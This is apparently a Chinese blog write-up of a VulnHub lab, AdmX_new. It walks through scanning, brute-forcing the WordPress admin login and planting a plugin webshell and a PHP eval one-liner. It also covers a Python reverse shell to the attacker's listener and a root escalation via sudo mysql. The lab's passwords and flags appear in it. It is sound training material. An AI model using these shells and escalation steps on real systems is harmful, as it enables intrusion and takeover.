---
title: 打靶AdmX_new
top: false
cover: true
toc: true
mathjax: true
tags:
  - 博客
categories:
  - 靶机：AdmX_new
abbrlink: 57827
date: 2021-10-10 14:20:53
password:
summary:
  - 取得root权限和2个flag
---

> 靶机地址：https://download.vulnhub.com/admx/AdmX_new.7z

### 总体介绍

#### 背景

​	无

#### 目标

​	取得root权限和2个flag

#### 难度

​	medium

#### 对该靶机进行的攻击方法及工具

- 端口扫描/主机发现
- web信息搜集
- *BurpSuite*自动替换
- 密码爆破
- MSF漏洞利用
- *Wordpress*漏洞利用
- 反弹shell升级（可以自动补齐）
- 获取第二个反弹shell（蚁剑）
- MySQL提权
- 另类提权方法
- *BurpSuite*，*蚁剑*，*feroxbuster*

### 让我们开始吧

#### 		小问题

​	在安装完靶机后发现了靶机无法获取ip地址的问题，在这里简单的说一下解决办法

- ##### 使用VirtualBox虚拟机

  - 这个靶机的作者更于推荐我们使用VirtualBox虚拟机，有时候发生这种情况是虚拟机配置问题，所以我们更该一下虚拟机就能解决。

- ##### 使用单用户模式修改网络配置

  - 如果更换后没有解决，很有可能是网络配置原因，在这里简单说一下

  - 在靶机启动后无法获得IP地址，首先将虚拟机重启，并在重启的黑屏阶段**按住**方向键盘的**向上键**，这样就会调出系统的启动菜单（有可能要重复多次），你就会看到如下界面：![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101449499.png)

  - 这时单击键盘中的字母“e”，修改内核加载中的配置，进行修改

    - 修改前![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101503595.png)
    - 修改后![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101506789.png)

  - 然后按`Ctrl + x`进入单用户模式即root模式，使用`ip a`命令查看当前网卡设备名称知道它时`enp0s17`![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101509339.png)

  - 查看网络配置文件中的网卡名称

    ```shell
    # RedHat
    vi /etc/network/interfaces
    
    # UBUNTU
    vi /etc/netplan/00-installer-config.yaml
    
    ```

  - 将配置文件中的网卡名称修改为当前的正确名称，并确定DHCP启动![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101515180.png)
  - 保存修改，重启即可成功，接下来就可以愉快的打靶了

#### 	  主机发现

​	今天我们使用nmap进行主机发现，这个工具非常强大。

​	使用命令`sudo nmap -sn 10.0.2.0/24  `进行主机扫描，很快扫描完成结果如下：（10.0.2.15是我自己的kali主机）得到靶机ip地址：*10.0.2.8*

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101528440.png)

​	使用命令`sudo nmap -p- 10.0.2.8`对靶机端口进行扫描，这次扫描时间很久，大概用了两分钟时间才扫描结束。扫描结果只得到了一个80端口，不出意外它应该是一个http的服务。

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101533989.png)

​	我们使用命令`sudo nmap -p80 -sV 10.0.2.8`对它进行服务的发现，得到如下结果

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101536209.png)

​	果然是一个web页面。

#### web信息搜集

​	通过访问*10.0.2.8:80*我们可以看到它时*Apache*的起始页面，在这个页面中我们没有发现有用的信息。![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101539246.png)

​	接下来我们就要进行一项常规操作，对目标八级web隐藏目录进行发现，先前我们使用的是*dirsearch*这款工具，今天我们使用另一款工具*feroxbuster*，往往使用不同的工具它会有不用的结果，我们可以使用不同的工具，对得到的结果进行分析。

​	使用命令`feroxbuster --url http://10.0.2.8`进行查看，但如果直接使用的话可能会报错，原因是它默认需要一个字典叫做*seclists*，我们可以使用命令`sudo apt install seclists ` 进行安装。但是这个字典太大了，我们可以对它进行指定字典扫描。

使用命令

```shell
sudo feroxbuster --url http://10.0.2.8 -w /usr/share/dirb/wordlists/common.txt
```

让它使用指定字典进行扫描，在扫描过程中我们发现了一些现象

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101559604.png)

我们发现大量结果都指向*wordpress*路径，而且它返回结果是301，表示重定向，我们对它进行访问，包括它底下的标志性admin目录。我访问了`http://10.0.2.8/wordpress/`和`10.0.2.8/wordpress/admin`。我们在访问中发现，加载速度非常缓慢，而且加载不完全

​	![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101606236.png)

这种时候我们就要使用*BurpSuite*工具来查看一下是哪些元素使它加载缓慢。

我们首先关闭BP的截断功能然后刷新一下页面。然后我们进入BP的HTTPhistory页面，得到结果：

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101611869.png)

我们发现当我们访问靶机10.0.2.8时它请求了ip为192.168.159.145下的三个不同资源，我们在结果中搜索192.168.159.145，我们发现它是被硬编码写入的，因此我们没有办法访问到一些资源

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101617964.png)

发现这个问题后，我们点击`Proxy --> Options`，拉到下面，`Match and Replace`中，先取消所有已存在内容，然后手动添加以下内容：

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101622261.png)

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121605746.png)

修改完成过后我们回到浏览器页面再次刷新，发现这回速度很快，而且获取到了资源

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121606828.png)

但是高兴太早了，经过我的一番测试，并没有在该页面和链接处发现明显的漏洞，于是我回到了之前的隐藏目录，发现了这样一个路径`http://10.0.2.8/wordpress/wp-admin`似乎是后台登陆页面。

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101630804.png)

看到这个界面，我的思路就不受约束的指向了密码暴力破解。

#### 密码爆破

我们首先搜索了Wordpress CMS，得知它的默认管理员账号是admin，由此我们可以进行密码爆破

首先选择字典我选择的是*SuperWordlist*下的*MidPwds*

接下来开启BP的拦截功能，然后提交一个错误的密码，让BP截获，然后发给intruder，我们只选择密码的字段，将它添加为数据注入点

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101642910.png)

然后在`Payloads`中选择如下

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101645486.png)

然后进行attack。

经过漫长的等待，最终拿到了，得到它的密码是adam14，

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101826624.png)

我们登陆后得到如下界面：

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101903692.png)

那接下来的任务就是通过*Wordpress*的漏洞获得shell

#### *Wordpress*漏洞利用

总体来说*Wordpress*有三种利用漏洞的方法

- **通过Media->Add New上传shell文件**![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101909402.png)

  ​	很遗憾，在这里无法利用此漏洞

- **通过点击Appearance->Theme Editor，修改主题,嵌入代码**

  - 在这里最经常使用的是404模板来进行代码注入例如*蚁剑的一句话代码*

    ​	`<?php eval($_POST['ant']);?> `![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101918587.png)

    ​	很遗憾我们在保存的过程中发生了错误![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101919004.png)

- **自己写一个插件,增加到服务器中（*Plugins->Add New->Upload Plugin*）**

  - 收现在kali编写插件 shell.php（必须包含头部信息，否则无法识别）![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101929132.png)
  - 要注意压缩成zip格式的文件才能上传，使用命令`zip shell.zip shell.php`进行压缩![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101933884.png)
  - 接下去进行上传，注意要记得激活插件![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101934249.png)
  - 它的存储路径在`10.0.2.8/wordpress/wp-content/plugins/shell.php`我们可以在它之后加上id命令来查看是否成功，上句末尾加上`?cmd=id`进行查看![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121606565.png)

  至此Wordpress漏洞利用成功，我们接下来就要拿到反弹shell。

#### 反弹shell

##### 	方法一

​	我们可以查看一下，靶机是否存在python，如果存在我们可以很方便的进行反弹，我们在末尾输入`which python` `which python2` `which python3`,我们发现只有python3这个版本是存在的。![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110101946082.png)

​	因此我们可以执行python反弹shell，首先在kali本机侦听4444端口然后在浏览器末尾加上代码

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;
pty.spawn("/bin/bash")'
```

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121607576.png)

成功获得反弹shell。

#####  方法二

​	通过MSF利用Wordpress的漏洞来获取shell。

​	使用命令`sudo msfdb run`来启动msf，并通过命令`search wordpress admin`来获取wordpress后来相关的漏洞。我们得到了这样一个漏洞，通过后台admin来进行上传。

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102144893.png)

​	使用命令`use 2`和`show options`来查看一下这个模块需要我们设置什么选项。![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102147931.png)

​	通过查看我们可知要修改PASSWORD,RHOSTS,TARGETURI,和USERNAME，因此我们做出如下修改，在输入run运行。![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102154974.png)

​	然后我们就得到了*meterpreter*在输入*shell*即可获得权限

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102158579.png)

​	但是这种方式获得shell有一定的缺陷，比如`pwd`和`ls`无法正常使用，英雌我们还是使用第一种方法获得的shell。

#### 蚁剑

##### 	目标

​	在这一部分，需要达到的目的是获取多个shell，因为在真实的渗透环境中,我们往往会遇到很多不确定因素，比如一个漏洞只有在第一次触发的时候有效，再次触发就无效了！或者因为网络等原因，某个shell突然就掉了。这样的话会浪费很多的时间去重新拿到shell，因此，我们在拿到一个shell之后，就要先想办法获取第二个甚至第三个shell，来稳定获得的权限。

##### 	思路

​	我们可以通过修改先前的404模板，用蚁剑的一句话*webshell*，来获得另一个shell。

##### 	实现一

​	我们使用命令`cd wp-content/themes/twentytwentyone`进入主题目录，并编辑404.php文件![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102213276.png)

​	这时候我们将会发现一个非常严重的问题，首先在这个状态下没有办法自动补齐，其次，在编辑404.php文件时，无法使用方向键，即在与靶机文件进行交互时还有比较严重的问题![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102216953.png)

​	基于此，我们需要升级我们的webshell，让它变为可交互的shell。

##### 	*webshell*升级

​	注意：升级成Full TTY Shell只是用于bash，如果你使用的也是Kali Linux,那么在此之前,可能需要先把zsh切换为bash。

​	由于我使用的是zsh，所以我输入命令`echo $SHELL` 来查看当前shell类型，使用命令`chsh -s /bin/bash`来转换shell，并重启。(注意不要加sudo)![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102223180.png)

​		重启之后，我们现在已经是bash类型，我们再把虚拟机调整到先前状态。

调整好之后，我们作如下步骤：

1. 输入`Ctrl+Z`将已经获取的webshell保存到后台。

2. 输入`stty raw -echo`

3. 输入`fg`调取刚才保存的shell，注意fg把那个不会显示。

4. 输入`export SHELL=/bin/bash`

5. 输入`export TERM=screen`

6. 输入`stty rows 38 columns 126`设置终端大小38行126列

7. 输入`reset` 

   至此升级成功，已经可以自动补齐且可进行交互。

#####    实现二

​	我们现在在来编辑404.php文件，加入蚁剑一句话代码。

​	![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102259201.png)

​	我们启动蚁剑，添加数据，测试链接，成功后点击添加

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102313649.png)

​	

​	添加完成后，打开它的终端，成功，我们获得第二个shell

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102316121.png)

#### 第一次提权

​	我们回到命令行shell，使用命令`cat /etc/passwd | grep /bin/bash`查看系统用户账号

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102321240.png)

发现了一个wpadmin账号，这应该是管理员账号了，我们查看它的文件夹

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121607859.png)

发现只能由他自己才能查看，因此，提权成为唯一出路。

使用命令`uname -a `查看内核版本，以及寻找针对它的内核漏洞，一无所获。

使用命令`sudo -l `发现没有sudo权限。

##### 	思路

​	这两条路都行不通，我们就想到*wordpress*框架的配置文件,里面可能有对应的数据库连接密码。

##### 	实现

​	通过命令`cat /var/www/html/wordpress/wp-config.php`查看配置文件

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102331685.png)

我得到了一个账号和密码，但这个账号具体有没有用，我并不清楚。

我第一反应是登陆一下这个数据库，使用命令`mysql -u admin -p Wp_Admin#123 -D wordpress`，发现并没有成功。

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102348493.png)

由于密码的复用性，我决定尝试看看能不能用这个密码su到wpadmin用户，同样失败了。![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102350508.png)

在这时候我想起了另一个密码，在爆破web是得到的密码：adam14，我们拿它试一下。![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102352129.png)

​	意外惊喜，竟然成功了。

我们回到主目录下查看local.txt，拿到第一个flag。`153495edec1b606c24947b1335998bd9`

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110102354068.png)

#### 第二次提权

​	我们使用命令`sudo -l`发现了提权的方法

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110121608574.png)

我们发现我们不用密码就能执行这条命令，而且是root权限

我们就使用命令`sudo /usr/bin/mysql -u root -D wordpress -p `，发现还是需要密码，果断使用`adam14`，成功。

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110110000423.png)

我们得到了具有root权限数据库的管理进程。

数据库有一个`system`命令，可以执行操作系统命令。

如果顺利的话这就比较简单了，我们可以通过命令`system /bin/bash` 或`\! /bin/bash`得到操作系统的root权限。

![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110110009819.png)

很幸运，我们成功获得root权限以及第二个flag。`7efd721c8bfff2937c66235f2d0dbac1`，至此，提权成功，打靶结束。

### 总结

**今日打靶复现：**

1. 我们通过*nmap*工具进行了主机扫描和端口及服务发现。
2. 利用*feroxuster*工具进行了隐藏目录爆破。
3. 使用BurpSuite的自动替换功能解决web页面加载缓慢的问题。
4. 发现wordpress CMS的登陆点wp-login，并对它进行密码爆破。
5. 进入后台通过编写插件的方式获得反弹shell。
6. 升级Full TTY，编辑404.php文件获得蚁剑shell。
7. 通过密码复用，登陆了wpadmin用户，获得了第一个flag。
8. 通过`sudo -l`，发现漏洞，并以root权限登陆了mysql命令行。
9. 通过命令`system /bin/bash`，我们成功获得root权限的shell，得到了第二个flag。
10. 打靶结束。

